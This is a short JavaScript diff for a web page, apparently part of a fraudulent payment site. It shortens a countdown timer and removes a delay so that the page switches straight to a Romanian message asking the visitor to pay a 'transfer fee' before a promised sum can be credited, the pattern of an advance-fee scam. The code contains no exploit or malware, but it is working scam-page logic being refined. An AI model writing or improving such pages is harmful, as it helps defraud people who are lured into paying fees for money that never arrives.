@@ -785,7 +785,7 @@ window.scrollTo({
 top: document.body.scrollHeight,
 behavior: "smooth"
 });
-let temps = 20;
+let temps = 11;
 let pourcentage = 0;
 
 const bar =
@@ -813,11 +813,9 @@ tempsTexte.innerHTML =
 temps + " secunde rămase";
 if (temps <= 0) {
 
-clearInterval(interval);
+    clearInterval(interval);
 
-setTimeout(function(){
-
-document.body.innerHTML = `
+    document.body.innerHTML = `
 <div style="
 background:#f4f6fb;
 min-height:100vh;
@@ -897,7 +895,6 @@ Vă rugăm să achitați taxa de transfer pentru ca suma să poată fi creditat�
 </div>
 </div>
 `;
-},11000);
 
 }
 
